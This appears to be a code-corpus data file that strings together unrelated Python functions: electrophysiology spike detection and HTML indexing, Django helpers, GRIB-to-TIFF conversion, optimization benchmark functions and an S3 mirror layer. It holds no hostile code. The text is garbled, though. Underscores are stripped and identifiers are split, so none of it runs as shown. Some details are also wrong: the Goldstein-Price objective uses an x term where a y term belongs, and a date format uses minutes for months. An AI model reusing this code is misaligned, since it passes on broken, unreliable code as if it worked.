def linspace ( self , start , stop , n ) : if n == 1 : return [ start ] L = [ 0.0 ] * n nm1 = n - 1 nm1inv = 1.0 / nm1 for i in range ( n ) : L [ i ] = nm1inv * ( start * ( nm1 - i ) + stop * i ) return L
def load expansion ( self , key , root , pattern ) : path pattern = os . path . join ( root , pattern ) expanded paths = self . expand pattern ( path pattern ) specs = [ ] for ( path , tags ) in expanded paths : filelist = [ os . path . join ( path , f ) for f in os . listdir ( path ) ] if os . path . isdir ( path ) else [ path ] for filepath in filelist : specs . append ( dict ( tags , * * { key : os . path . abspath ( filepath ) } ) ) return sorted ( specs , key = lambda s : s [ key ] )
async def push ( self , * args , * * kwargs ) : self . data . append ( ( args , kwargs ) ) if self . future is not None : future , self . future = self . future , None future . set result ( True )
def figure Stimulus ( abf , sweeps = [ 0 ] ) : stimuli = [ 2.31250 , 2.35270 ] for sweep in sweeps : abf . setsweep ( sweep ) for stimulus in stimuli : S1 = int ( abf . points Per Sec * stimulus ) S2 = int ( abf . points Per Sec * ( stimulus + 0.001 ) ) # 1ms of blanking abf . sweep Y [ S1 : S2 ] = np . nan # blank out the stimulus area I1 = int ( abf . points Per Sec * 2.2 ) # time point (sec) to start I2 = int ( abf . points Per Sec * 2.6 ) # time point (sec) to end baseline = np . average ( abf . sweep Y [ int ( abf . points Per Sec * 2.0 ) : int ( abf . points Per Sec * 2.2 ) ] ) Ys = low Pass Filter ( abf . sweep Y [ I1 : I2 ] ) - baseline Xs = abf . sweep X2 [ I1 : I1 + len ( Ys ) ] . flatten ( ) plt . plot ( Xs , Ys , alpha = .5 , lw = 2 ) return
def do Stuff ( AB Ffolder , analyze = False , convert = False , index = True , overwrite = True , launch = True ) : IN = INDEX ( AB Ffolder ) if analyze : IN . analyze All ( ) if convert : IN . convert Images ( )
def analyze Single ( abf Fname ) : assert os . path . exists ( abf Fname ) and abf Fname . endswith ( ".abf" ) AB Ffolder , AB Ffname = os . path . split ( abf Fname ) abf ID = os . path . splitext ( AB Ffname ) [ 0 ] IN = INDEX ( AB Ffolder ) IN . analyze ABF ( abf ID ) IN . scan ( ) IN . html single basic ( [ abf ID ] , overwrite = True ) IN . html single plot ( [ abf ID ] , overwrite = True ) IN . scan ( ) IN . html index ( ) return
def analyze All ( self ) : searchable Data = str ( self . files2 ) self . log . debug ( "considering analysis for %d AB Fs" , len ( self . I Ds ) ) for ID in self . I Ds : if not ID + " " in searchable Data : self . log . debug ( "%s needs analysis" , ID ) try : self . analyze ABF ( ID ) except : print ( "EXCEPTION! " * 100 ) else : self . log . debug ( "%s has existing analysis, not overwriting" , ID ) self . log . debug ( "verified analysis of %d AB Fs" , len ( self . I Ds ) )
def html For ( self , fname ) : if os . path . splitext ( fname ) [ 1 ] . lower ( ) in [ '.jpg' , '.png' ] : html = '<a href="%s"><img src="%s"></a>' % ( fname , fname ) if " tif " in fname : html = html . replace ( '<img ' , '<img class="datapic micrograph"' ) if " plot " in fname : html = html . replace ( '<img ' , '<img class="datapic intrinsic" ' ) if " experiment " in fname : html = html . replace ( '<img ' , '<img class="datapic experiment" ' ) elif os . path . splitext ( fname ) [ 1 ] . lower ( ) in [ '.html' , '.htm' ] : html = 'LINK: %s' % fname else : html = '<br>Not sure how to show: [%s]</br>' % fname return html
def html single plot ( self , abf ID , launch = False , overwrite = False ) : if type ( abf ID ) is str : abf ID = [ abf ID ] for this AB Fid in cm . abf Sort ( abf ID ) : parent ID = cm . parent ( self . groups , this AB Fid ) save As = os . path . abspath ( "%s/%s plot.html" % ( self . folder2 , parent ID ) ) if overwrite is False and os . path . basename ( save As ) in self . files2 : continue files By Type = cm . files By Type ( self . group Files [ parent ID ] ) html = "" html += '<div style="background-color: #DDDDFF;">' html += '<span class="title">intrinsic properties for: %s</span></br>' % parent ID html += '<code>%s</code>' % os . path . abspath ( self . folder1 + "/" + parent ID + ".abf" ) html += '</div>' for fname in files By Type [ 'plot' ] : html += self . html For ( fname ) print ( "creating" , save As , '...' ) style . save ( html , save As , launch = launch )
def timeit ( timer = None ) : if timer is None : return time . time ( ) else : took = time . time ( ) - timer if took < 1 : return "%.02f ms" % ( took * 1000.0 ) elif took < 60 : return "%.02f s" % ( took ) else : return "%.02f min" % ( took / 60.0 )
def list move to front ( l , value = 'other' ) : l = list ( l ) if value in l : l . remove ( value ) l . insert ( 0 , value ) return l
def list move to back ( l , value = 'other' ) : l = list ( l ) if value in l : l . remove ( value ) l . append ( value ) return l
def parent ( groups , ID ) : if ID in groups . keys ( ) : return ID # already a parent if not ID in groups . keys ( ) : for actual Parent in groups . keys ( ) : if ID in groups [ actual Parent ] : return actual Parent # found the actual parent return None
def user Folder ( ) : #path=os.path.abspath(tempfile.gettempdir()+"/swhlab/") #don't use tempdir! it will get deleted easily. path = os . path . expanduser ( "~" ) + "/.swhlab/" # works on windows or linux # for me, path=r"C:\Users\swharden\.swhlab" if not os . path . exists ( path ) : print ( "creating" , path ) os . mkdir ( path ) return os . path . abspath ( path )
def abf Fname Load ( ) : fname = user Folder ( ) + "/abf Fname.ini" if os . path . exists ( fname ) : abf Fname = open ( fname ) . read ( ) . strip ( ) if os . path . exists ( abf Fname ) or abf Fname . endswith ( " . " ) : return abf Fname return os . path . abspath ( os . sep )
def abf Fname Save ( abf Fname ) : fname = user Folder ( ) + "/abf Fname.ini" with open ( fname , 'w' ) as f : f . write ( os . path . abspath ( abf Fname ) ) return
def check limit ( self , event ) : if self . count ( event ) > self . max listeners : warnings . warn ( 'Too many listeners for event {}' . format ( event ) , Resource Warning , )
def once ( self , event , listener ) : self . emit ( 'new listener' , event , listener ) self . once [ event ] . append ( listener ) self . check limit ( event ) return self
def gen PN Gs ( folder , files = None ) : if files is None : files = glob . glob ( folder + "/*.*" ) new = [ ] for fname in files : ext = os . path . basename ( fname ) . split ( "." ) [ - 1 ] . lower ( ) if ext in [ 'tif' , 'tiff' ] : if not os . path . exists ( fname + ".png" ) : print ( " -- converting %s to PNG..." % os . path . basename ( fname ) ) cm . image convert ( fname ) new . append ( fname ) #fancy burn-in of image data else : pass #print(" -- already converted %s to PNG..."%os.path.basename(fname)) return new
def html ABF ( ID , group , d , folder , overwrite = False ) : fname = folder + "/swhlab4/%s index.html" % ID if overwrite is False and os . path . exists ( fname ) : return html = TEMPLATES [ 'abf' ] html = html . replace ( "~ID~" , ID ) html = html . replace ( "~CONTENT~" , html AB Fcontent ( ID , group , d ) ) print ( " <- writing [%s]" % os . path . basename ( fname ) ) with open ( fname , 'w' ) as f : f . write ( html ) return
def gen Index ( folder , force I Ds = [ ] ) : if not os . path . exists ( folder + "/swhlab4/" ) : print ( " !! cannot index if no /swhlab4/" ) return timestart = cm . timethis ( ) files = glob . glob ( folder + "/*.*" ) #ABF folder files . extend ( glob . glob ( folder + "/swhlab4/*.*" ) ) print ( " -- indexing glob took %.02f ms" % ( cm . timethis ( timestart ) * 1000 ) ) files . extend ( gen PN Gs ( folder , files ) ) files = sorted ( files ) timestart = cm . timethis ( ) d = cm . get I Dfile Dict ( files ) #TODO: this is really slow print ( " -- filedict length:" , len ( d ) ) print ( " -- generating ID dict took %.02f ms" % ( cm . timethis ( timestart ) * 1000 ) ) groups = cm . get AB Fgroups ( files ) print ( " -- groups length:" , len ( groups ) ) for ID in sorted ( list ( groups . keys ( ) ) ) : overwrite = False for abf ID in groups [ ID ] : if abf ID in force I Ds : overwrite = True try : html ABF ( ID , groups [ ID ] , d , folder , overwrite ) except : print ( "~~ HTML GENERATION FAILED!!!" ) menu = exp Menu ( groups , folder ) make Splash ( menu , folder ) make Menu ( menu , folder ) html Frames ( d , folder ) make Menu ( menu , folder ) make Splash ( menu , folder )
def plot All Sweeps ( abf File ) : r = io . Axon IO ( filename = abf File ) bl = r . read block ( lazy = False , cascade = True ) print ( abf File + "\nplotting %d sweeps..." % len ( bl . segments ) ) plt . figure ( figsize = ( 12 , 10 ) ) plt . title ( abf File ) for sweep in range ( len ( bl . segments ) ) : trace = bl . segments [ sweep ] . analogsignals [ 0 ] plt . plot ( trace . times - trace . times [ 0 ] , trace . magnitude , alpha = .5 ) plt . ylabel ( trace . dimensionality ) plt . xlabel ( "seconds" ) plt . show ( ) plt . close ( )
def plot shaded data ( X , Y , variances , variance X ) : plt . plot ( X , Y , color = 'k' , lw = 2 ) n Chunks = int ( len ( Y ) / CHUNK POINTS ) for i in range ( 0 , 100 , PERCENT STEP ) : var Limit Low = np . percentile ( variances , i ) var Limit High = np . percentile ( variances , i + PERCENT STEP ) variance Is Above Min = np . where ( variances >= var Limit Low ) [ 0 ] variance Is Below Max = np . where ( variances <= var Limit High ) [ 0 ] variance Is Range = [ chunk Number for chunk Number in range ( n Chunks ) if chunk Number in variance Is Above Min and chunk Number in variance Is Below Max ] for chunk Number in variance Is Range : t1 = chunk Number * CHUNK POINTS / POINTS PER SEC t2 = t1 + CHUNK POINTS / POINTS PER SEC plt . axvspan ( t1 , t2 , alpha = .3 , color = COLORMAP ( i / 100 ) , lw = 0 )
def show variances ( Y , variances , variance X , log Scale = False ) : plt . figure ( 1 , figsize = ( 10 , 7 ) ) plt . figure ( 2 , figsize = ( 10 , 7 ) ) var Sorted = sorted ( variances ) plt . figure ( 1 ) plt . subplot ( 211 ) plt . grid ( ) plt . title ( "chronological variance" ) plt . ylabel ( "original data" ) plot shaded data ( X , Y , variances , variance X ) plt . margins ( 0 , .1 ) plt . subplot ( 212 ) plt . ylabel ( "variance (p A) (log%s)" % str ( log Scale ) ) plt . xlabel ( "time in sweep (sec)" ) plt . plot ( variance X , variances , 'k-' , lw = 2 ) plt . figure ( 2 ) plt . ylabel ( "variance (p A) (log%s)" % str ( log Scale ) ) plt . xlabel ( "chunk number" ) plt . title ( "sorted variance" ) plt . plot ( var Sorted , 'k-' , lw = 2 ) for i in range ( 0 , 100 , PERCENT STEP ) : var Limit Low = np . percentile ( variances , i ) var Limit High = np . percentile ( variances , i + PERCENT STEP ) label = "%2d-%d percentile" % ( i , i + + PERCENT STEP ) color = COLORMAP ( i / 100 ) print ( "%s: variance = %.02f - %.02f" % ( label , var Limit Low , var Limit High ) ) plt . figure ( 1 ) plt . axhspan ( var Limit Low , var Limit High , alpha = .5 , lw = 0 , color = color , label = label ) plt . figure ( 2 ) chunk Low = np . where ( var Sorted >= var Limit Low ) [ 0 ] [ 0 ] chunk High = np . where ( var Sorted >= var Limit High ) [ 0 ] [ 0 ] plt . axvspan ( chunk Low , chunk High , alpha = .5 , lw = 0 , color = color , label = label ) for fignum in [ 1 , 2 ] : plt . figure ( fignum ) if log Scale : plt . semilogy ( ) plt . margins ( 0 , 0 ) plt . grid ( ) if fignum is 2 : plt . legend ( fontsize = 10 , loc = 'upper left' , shadow = True ) plt . tight layout ( ) plt . savefig ( '2016-12-15-variance-%d-log%s.png' % ( fignum , str ( log Scale ) ) ) plt . show ( )
def detect ( self ) : self . log . info ( "initializing AP detection on all sweeps..." ) t1 = cm . timeit ( ) for sweep in range ( self . abf . sweeps ) : self . detect Sweep ( sweep ) self . log . info ( "AP analysis of %d sweeps found %d A Ps (completed in %s)" , self . abf . sweeps , len ( self . A Ps ) , cm . timeit ( t1 ) )
def detect Sweep ( self , sweep = 0 ) : if self . A Ps is False : # indicates detection never happened self . A Ps = [ ] # now indicates detection occured # delete every AP from this sweep from the existing array for i , ap in enumerate ( self . A Ps ) : if ap [ "sweep" ] == sweep : self . A Ps [ i ] = None if self . A Ps . count ( None ) : self . log . debug ( "deleting %d existing A Ps from memory" , self . A Ps . count ( None ) ) while None in self . A Ps : self . A Ps . remove ( None ) self . log . debug ( "initiating AP detection (%d already in memory)" , len ( self . A Ps ) ) self . abf . derivative = True self . abf . setsweep ( sweep ) # detect potential AP (Is) by a d V/d T threshold crossing Is = cm . where cross ( self . abf . sweep D , self . detect over ) self . log . debug ( "initial AP detection: %d A Ps" % len ( Is ) ) # eliminate A Ps where d V/d T doesn't cross below -10 V/S within 2 ms for i , I in enumerate ( Is ) : if np . min ( self . abf . sweep D [ I : I + 2 * self . abf . points Per Ms ] ) > - 10 : Is [ i ] = 0 Is = Is [ np . nonzero ( Is ) ] self . log . debug ( "after lower threshold checking: %d A Ps" % len ( Is ) ) # walk 1ms backwards and find point of +10 V/S threshold crossing for i , I in enumerate ( Is ) : step Back = 0 while ( self . abf . sweep D [ I - step Back ] ) > 10 and step Back / self . abf . points Per Ms < 1 : #2ms max step Back += 1 Is [ i ] -= step Back # analyze each AP sweep A Ps = [ ] for i , I in enumerate ( Is ) : try : time In Sweep = I / self . abf . points Per Sec if time In Sweep < self . detect time1 or time In Sweep > self . detect time2 : continue # skip because it's not within the marks ap = { } # create the AP entry ap [ "sweep" ] = sweep # number of the sweep containing this AP ap [ "I" ] = I # index sweep point of start of AP (10 m V/ms threshold crossing) ap [ "Tsweep" ] = I / self . abf . points Per Sec # time in the sweep of index crossing (sec) ap [ "T" ] = ap [ "Tsweep" ] + self . abf . sweep Interval * sweep # time in the experiment ap [ "Vthreshold" ] = self . abf . sweep Y [ I ] # threshold at rate of -10m V/ms # determine how many points from the start d V/dt goes below -10 (from a 5ms chunk) chunk = self . abf . sweep D [ I : I + 5 * self . abf . points Per Ms ] # give it 5ms to cross once I to Neg Ten = np . where ( chunk < - 10 ) [ 0 ] [ 0 ] chunk = self . abf . sweep D [ I + I to Neg Ten : I + I to Neg Ten + 10 * self . abf . points Per Ms ] # give it 30ms to cross back if not max ( chunk ) > - 10 : self . log . debug ( "skipping unreal AP at T=%f" % ap [ "T" ] ) self . log . error ( "^^^ can you confirm this is legit?" ) continue # probably a pre-AP "bump" to be ignored I recover = np . where ( chunk > - 10 ) [ 0 ] [ 0 ] + I to Neg Ten + I # point where trace returns to above -10 V/S ap [ "d Vfast Is" ] = [ I , I recover ] # span of the fast component of the d V/dt trace ap [ "d Vfast MS" ] = ( I recover - I ) / self . abf . points Per Ms # time (in ms) of this fast AP component # determine derivative min/max from a 2ms chunk which we expect to capture the fast AP chunk = self . abf . sweep D [ ap [ "d Vfast Is" ] [ 0 ] : ap [ "d Vfast Is" ] [ 1 ] ] ap [ "d Vmax" ] = np . max ( chunk ) ap [ "d Vmax I" ] = np . where ( chunk == ap [ "d Vmax" ] ) [ 0 ] [ 0 ] + I ap [ "d Vmin" ] = np . min ( chunk ) ap [ "d Vmin I" ] = np . where ( chunk == ap [ "d Vmin" ] ) [ 0 ] [ 0 ] + I if ap [ "d Vmax" ] < 10 or ap [ "d Vmin" ] > - 10 : self . log . debug ( "throwing out AP with low d V/dt to be an AP" ) self . log . error ( "^^^ can you confirm this is legit?" ) continue # before determining AP shape stats, see where trace recovers to threshold chunk Size = self . abf . points Per Ms * 10 #AP shape may be 10ms if len ( Is ) - 1 > i and Is [ i + 1 ] < ( I + chunk Size ) : # if slow AP runs into next AP chunk Size = Is [ i + 1 ] - I # chop it down if chunk Size < ( self . abf . points Per Ms * 2 ) : continue # next AP is so soon, it's >500 Hz. Can't be real. ap [ "Vslow Is" ] = [ I , I + chunk Size ] # time range of slow AP dynamics chunk = self . abf . sweep Y [ I : I + chunk Size ] # determine AP peak and minimum ap [ "Vmax" ] = np . max ( chunk ) ap [ "Vmax I" ] = np . where ( chunk == ap [ "Vmax" ] ) [ 0 ] [ 0 ] + I chunk For Min = np . copy ( chunk ) # so we can destroy it chunk For Min [ : ap [ "Vmax I" ] - I ] = np . inf # minimum won't be before peak now ap [ "Vmin" ] = np . min ( chunk For Min ) # supposedly the minimum is the AHP ap [ "Vmin I" ] = np . where ( chunk For Min == ap [ "Vmin" ] ) [ 0 ] [ 0 ] + I if ap [ "Vmin I" ] < ap [ "Vmax I" ] : self . log . error ( "-------------------------------" ) self . log . error ( "how is the AHP before the peak?" ) #TODO: start chunk at the peak self . log . error ( "-------------------------------" ) #print((I+len(chunk))-ap["Vmin I"],len(chunk)) if ( len ( chunk ) ) - ( ( I + len ( chunk ) ) - ap [ "Vmin I" ] ) < 10 : self . log . error ( "-------------------------------" ) self . log . error ( "HP too close for comfort!" ) self . log . error ( "-------------------------------" ) ap [ "ms Rise Time" ] = ( ap [ "Vmax I" ] - I ) / self . abf . points Per Ms # time from threshold to peak ap [ "ms Fall Time" ] = ( ap [ "Vmin I" ] - ap [ "Vmax I" ] ) / self . abf . points Per Ms # time from peak to nadir # determine halfwidth ap [ "Vhalf" ] = np . average ( [ ap [ "Vmax" ] , ap [ "Vthreshold" ] ] ) # half way from threshold to peak ap [ "Vhalf I1" ] = cm . where cross ( chunk , ap [ "Vhalf" ] ) [ 0 ] + I # time it's first crossed ap [ "Vhalf I2" ] = cm . where cross ( - chunk , - ap [ "Vhalf" ] ) [ 1 ] + I # time it's second crossed ap [ "ms Halfwidth" ] = ( ap [ "Vhalf I2" ] - ap [ "Vhalf I1" ] ) / self . abf . points Per Ms # time between crossings # AP error checking goes here # TODO: # if we got this far, add the AP to the list sweep A Ps . extend ( [ ap ] ) except Exception as e : self . log . error ( "crashed analyzing AP %d of %d" , i , len ( Is ) ) self . log . error ( cm . exception To String ( e ) ) #cm.pause() #cm.wait For(30) #self.log.error("EXCEPTION!:\n%s"%str(sys.exc info())) self . log . debug ( "finished analyzing sweep. Found %d A Ps" , len ( sweep A Ps ) ) self . A Ps . extend ( sweep A Ps ) self . abf . derivative = False
def get author and version ( package ) : init py = open ( os . path . join ( package , ' init .py' ) ) . read ( ) author = re . search ( " author  = ['\"]([^'\"]+)['\"]" , init py ) . group ( 1 ) version = re . search ( " version  = ['\"]([^'\"]+)['\"]" , init py ) . group ( 1 ) return author , version
def add parsley ns ( cls , namespace dict ) : namespace dict . update ( { 'parslepy' : cls . LOCAL NAMESPACE , 'parsley' : cls . LOCAL NAMESPACE , } ) return namespace dict
def message is to me ( self , data ) : return ( data . get ( 'type' ) == 'message' and data . get ( 'text' , '' ) . startswith ( self . address as ) )
def get app locations ( ) : return [ os . path . dirname ( os . path . normpath ( import module ( app name ) . file ) ) for app name in PROJECT APPS ]
def get tasks ( ) : task classes = [ ] for task path in TASKS : try : module , classname = task path . rsplit ( '.' , 1 ) except Value Error : raise Improperly Configured ( '%s isn\'t a task module' % task path ) try : mod = import module ( module ) except Import Error as e : raise Improperly Configured ( 'Error importing task %s: "%s"' % ( module , e ) ) try : task class = getattr ( mod , classname ) except Attribute Error : raise Improperly Configured ( 'Task module "%s" does not define a ' '"%s" class' % ( module , classname ) ) task classes . append ( task class ) return task classes
def get task options ( ) : options = ( ) task classes = get tasks ( ) for cls in task classes : options += cls . option list return options
def add ( self , * entries ) : for entry in entries : if isinstance ( entry , string types ) : self . add entries ( database . parse string ( entry , bib format = 'bibtex' ) ) else : self . add entries ( entry )
def get cache key ( user or username , size , prefix ) : if isinstance ( user or username , get user model ( ) ) : user or username = user or username . username return '%s %s %s' % ( prefix , user or username , size )
def invalidate cache ( user , size = None ) : sizes = set ( AUTO GENERATE AVATAR SIZES ) if size is not None : sizes . add ( size ) for prefix in cached funcs : for size in sizes : cache . delete ( get cache key ( user , size , prefix ) )
def get pref model class ( app , prefs , get prefs func ) : module = '%s.%s' % ( app , PREFS MODULE NAME ) model dict = { ' prefs app' : app , ' get prefs' : staticmethod ( get prefs func ) , ' module ' : module , 'Meta' : type ( 'Meta' , ( models . options . Options , ) , { 'verbose name' : ( 'Preference' ) , 'verbose name plural' : ( 'Preferences' ) , 'app label' : app , 'managed' : False , } ) } for field name , val proxy in prefs . items ( ) : model dict [ field name ] = val proxy . field model = type ( 'Preferences' , ( models . Model , ) , model dict ) def fake save base ( self , * args , * * kwargs ) : updated prefs = { f . name : getattr ( self , f . name ) for f in self . meta . fields if not isinstance ( f , models . fields . Auto Field ) } app prefs = self . get prefs ( self . prefs app ) for pref in app prefs . keys ( ) : if pref in updated prefs : app prefs [ pref ] . db value = updated prefs [ pref ] self . pk = self . prefs app # Make Django 1.7 happy. prefs save . send ( sender = self , app = self . prefs app , updated prefs = updated prefs ) return True model . save base = fake save base return model
def print file info ( ) : tpl = Table Logger ( columns = 'file,created,modified,size' ) for f in os . listdir ( '.' ) : size = os . stat ( f ) . st size date created = datetime . fromtimestamp ( os . path . getctime ( f ) ) date modified = datetime . fromtimestamp ( os . path . getmtime ( f ) ) tpl ( f , date created , date modified , size )
def dispatch ( self , func ) : self . callees . append ( self . make dispatch ( func ) ) return self . make wrapper ( func )
def convert Shp To Extend ( path To Shp ) : driver = ogr . Get Driver By Name ( 'ESRI Shapefile' ) dataset = driver . Open ( path To Shp ) if dataset is not None : # from Layer layer = dataset . Get Layer ( ) spatial Ref = layer . Get Spatial Ref ( ) # from Geometry feature = layer . Get Next Feature ( ) geom = feature . Get Geometry Ref ( ) spatial Ref = geom . Get Spatial Reference ( ) #WGS84 out Spatial Ref = osr . Spatial Reference ( ) out Spatial Ref . Import From EPSG ( 4326 ) coord Trans = osr . Coordinate Transformation ( spatial Ref , out Spatial Ref ) env = geom . Get Envelope ( ) point MAX = ogr . Geometry ( ogr . wkb Point ) point MAX . Add Point ( env [ 1 ] , env [ 3 ] ) point MAX . Transform ( coord Trans ) point MIN = ogr . Geometry ( ogr . wkb Point ) point MIN . Add Point ( env [ 0 ] , env [ 2 ] ) point MIN . Transform ( coord Trans ) return [ point MAX . Get Point ( ) [ 1 ] , point MIN . Get Point ( ) [ 0 ] , point MIN . Get Point ( ) [ 1 ] , point MAX . Get Point ( ) [ 0 ] ] else : exit ( " shapefile not found. Please verify your path to the shapefile" )
def convert Grib To Tiff ( liste File , list Param , list Level , liststep , grid , start Date , end Date , out Folder ) : dico Values = { } for l in liste File : grbs = pygrib . open ( l ) grbs . seek ( 0 ) index = 1 for j in range ( len ( list Level ) , 0 , - 1 ) : for i in range ( len ( list Param ) - 1 , - 1 , - 1 ) : grb = grbs [ index ] p = grb . name . replace ( ' ' , ' ' ) if grb . level != 0 : l = str ( grb . level ) + ' ' + grb . type Of Level else : l = grb . type Of Level if p + ' ' + l not in dico Values . keys ( ) : dico Values [ p + ' ' + l ] = [ ] dico Values [ p + ' ' + l ] . append ( grb . values ) shape = grb . values . shape lat , lon = grb . latlons ( ) geoparam = ( lon . min ( ) , lat . max ( ) , grid , grid ) index += 1 nb Jour = ( end Date - start Date ) . days + 1 #on joute des array Nan si il manque des fichiers for s in range ( 0 , ( len ( liststep ) * nb Jour - len ( liste File ) ) ) : for k in dico Values . keys ( ) : dico Values [ k ] . append ( np . full ( shape , np . nan ) ) #On crit pour chacune des variables dans un fichier for i in range ( len ( dico Values . keys ( ) ) - 1 , - 1 , - 1 ) : dict Param = dict ( ( k , dico Values [ dico Values . keys ( ) [ i ] ] [ k ] ) for k in range ( 0 , len ( dico Values [ dico Values . keys ( ) [ i ] ] ) ) ) sorted ( dict Param . items ( ) , key = lambda x : x [ 0 ] ) output Img = out Folder + '/' + dico Values . keys ( ) [ i ] + ' ' + start Date . strftime ( '%Y%M%d' ) + ' ' + end Date . strftime ( '%Y%M%d' ) + '.tif' write Tiff From Dico Array ( dict Param , output Img , shape , geoparam ) for f in liste File : os . remove ( f )
def doublewell ( theta ) : k0 , k1 , depth = 0.01 , 100 , 0.5 shallow = 0.5 * k0 * theta ** 2 + depth deep = 0.5 * k1 * theta ** 2 obj = float ( np . minimum ( shallow , deep ) ) grad = np . where ( deep < shallow , k1 * theta , k0 * theta ) return obj , grad
def rosenbrock ( theta ) : x , y = theta obj = ( 1 - x ) ** 2 + 100 * ( y - x ** 2 ) ** 2 grad = np . zeros ( 2 ) grad [ 0 ] = 2 * x - 400 * ( x * y - x ** 3 ) - 2 grad [ 1 ] = 200 * ( y - x ** 2 ) return obj , grad
def camel ( theta ) : x , y = theta obj = 2 * x ** 2 - 1.05 * x ** 4 + x ** 6 / 6 + x * y + y ** 2 grad = np . array ( [ 4 * x - 4.2 * x ** 3 + x ** 5 + y , x + 2 * y ] ) return obj , grad
def bohachevsky1 ( theta ) : x , y = theta obj = x ** 2 + 2 * y ** 2 - 0.3 * np . cos ( 3 * np . pi * x ) - 0.4 * np . cos ( 4 * np . pi * y ) + 0.7 grad = np . array ( [ 2 * x + 0.3 * np . sin ( 3 * np . pi * x ) * 3 * np . pi , 4 * y + 0.4 * np . sin ( 4 * np . pi * y ) * 4 * np . pi , ] ) return obj , grad
def dixon price ( theta ) : x , y = theta obj = ( x - 1 ) ** 2 + 2 * ( 2 * y ** 2 - x ) ** 2 grad = np . array ( [ 2 * x - 2 - 4 * ( 2 * y ** 2 - x ) , 16 * ( 2 * y ** 2 - x ) * y , ] ) return obj , grad
def goldstein price ( theta ) : x , y = theta obj = ( 1 + ( x + y + 1 ) ** 2 * ( 19 - 14 * x + 3 * x ** 2 - 14 * y + 6 * x * y + 3 * y ** 2 ) ) * ( 30 + ( 2 * x - 3 * y ) ** 2 * ( 18 - 32 * x + 12 * x ** 2 + 48 * y - 36 * x * y + 27 * x ** 2 ) ) grad = np . array ( [ ( ( 2 * x - 3 * y ) ** 2 * ( 78 * x - 36 * y - 32 ) + ( 8 * x - 12 * y ) * ( 39 * x ** 2 - 36 * x * y - 32 * x + 48 * y + 18 ) ) * ( ( x + y + 1 ) ** 2 * ( 3 * x ** 2 + 6 * x * y - 14 * x + 3 * y ** 2 - 14 * y + 19 ) + 1 ) + ( ( 2 * x - 3 * y ) ** 2 * ( 39 * x ** 2 - 36 * x * y - 32 * x + 48 * y + 18 ) + 30 ) * ( ( x + y + 1 ) ** 2 * ( 6 * x + 6 * y - 14 ) + ( 2 * x + 2 * y + 2 ) * ( 3 * x ** 2 + 6 * x * y - 14 * x + 3 * y ** 2 - 14 * y + 19 ) ) , ( ( - 36 * x + 48 ) * ( 2 * x - 3 * y ) ** 2 + ( - 12 * x + 18 * y ) * ( 39 * x ** 2 - 36 * x * y - 32 * x + 48 * y + 18 ) ) * ( ( x + y + 1 ) ** 2 * ( 3 * x ** 2 + 6 * x * y - 14 * x + 3 * y ** 2 - 14 * y + 19 ) + 1 ) + ( ( 2 * x - 3 * y ) ** 2 * ( 39 * x ** 2 - 36 * x * y - 32 * x + 48 * y + 18 ) + 30 ) * ( ( x + y + 1 ) ** 2 * ( 6 * x + 6 * y - 14 ) + ( 2 * x + 2 * y + 2 ) * ( 3 * x ** 2 + 6 * x * y - 14 * x + 3 * y ** 2 - 14 * y + 19 ) ) , ] ) return obj , grad
def styblinski tang ( theta ) : x , y = theta obj = 0.5 * ( x ** 4 - 16 * x ** 2 + 5 * x + y ** 4 - 16 * y ** 2 + 5 * y ) grad = np . array ( [ 2 * x ** 3 - 16 * x + 2.5 , 2 * y ** 3 - 16 * y + 2.5 , ] ) return obj , grad
def create bucket ( self , * args , * * kwargs ) : bucket = super ( S3Connection , self ) . create bucket ( * args , * * kwargs ) if bucket : mimicdb . backend . sadd ( tpl . connection , bucket . name ) return bucket
def delete keys ( self , * args , * * kwargs ) : ikeys = iter ( kwargs . get ( 'keys' , args [ 0 ] if args else [ ] ) ) while True : try : key = ikeys . next ( ) except Stop Iteration : break if isinstance ( key , basestring ) : mimicdb . backend . srem ( tpl . bucket % self . name , key ) mimicdb . backend . delete ( tpl . key % ( self . name , key ) ) elif isinstance ( key , Boto Key ) or isinstance ( key , Key ) : mimicdb . backend . srem ( tpl . bucket % self . name , key . name ) mimicdb . backend . delete ( tpl . key % ( self . name , key . name ) ) return super ( Bucket , self ) . delete keys ( * args , * * kwargs )
def delete key internal ( self , * args , * * kwargs ) : mimicdb . backend . srem ( tpl . bucket % self . name , args [ 0 ] ) mimicdb . backend . delete ( tpl . key % ( self . name , args [ 0 ] ) ) return super ( Bucket , self ) . delete key internal ( * args , * * kwargs )
def sdcone ( x , rho ) : U , V = np . linalg . eigh ( x ) return V . dot ( np . diag ( np . maximum ( U , 0 ) ) . dot ( V . T ) )
def columns ( x , rho , proxop ) : xnext = np . zeros like ( x ) for ix in range ( x . shape [ 1 ] ) : xnext [ : , ix ] = proxop ( x [ : , ix ] , rho ) return xnext
def gradient optimizer ( coro ) : class Gradient Optimizer ( Optimizer ) : @ wraps ( coro ) def init ( self , * args , * * kwargs ) : self . algorithm = coro ( * args , * * kwargs ) self . algorithm . send ( None ) self . operators = [ ] def set transform ( self , func ) : self . transform = compose ( destruct , func , self . restruct ) def minimize ( self , f df , x0 , display = sys . stdout , maxiter = 1e3 ) : self . display = display self . theta = x0 # setup xk = self . algorithm . send ( destruct ( x0 ) . copy ( ) ) store = defaultdict ( list ) runtimes = [ ] if len ( self . operators ) == 0 : self . operators = [ proxops . identity ( ) ] # setup obj , grad = wrap ( f df , x0 ) transform = compose ( destruct , * reversed ( self . operators ) , self . restruct ) self . optional print ( tp . header ( [ 'Iteration' , 'Objective' , '||Grad||' , 'Runtime' ] ) ) try : for k in count ( ) : # setup tstart = perf counter ( ) f = obj ( xk ) df = grad ( xk ) xk = transform ( self . algorithm . send ( df ) ) runtimes . append ( perf counter ( ) - tstart ) store [ 'f' ] . append ( f ) # Update display self . optional print ( tp . row ( [ k , f , np . linalg . norm ( destruct ( df ) ) , tp . humantime ( runtimes [ - 1 ] ) ] ) ) if k >= maxiter : break except Keyboard Interrupt : pass self . optional print ( tp . bottom ( 4 ) ) # cleanup self . optional print ( u'\u279b Final objective: {}' . format ( store [ 'f' ] [ - 1 ] ) ) self . optional print ( u'\u279b Total runtime: {}' . format ( tp . humantime ( sum ( runtimes ) ) ) ) self . optional print ( u'\u279b Per iteration runtime: {} +/- {}' . format ( tp . humantime ( np . mean ( runtimes ) ) , tp . humantime ( np . std ( runtimes ) ) , ) ) # result return Optimize Result ( { 'x' : self . restruct ( xk ) , 'f' : f , 'df' : self . restruct ( df ) , 'k' : k , 'obj' : np . array ( store [ 'f' ] ) , } ) return Gradient Optimizer
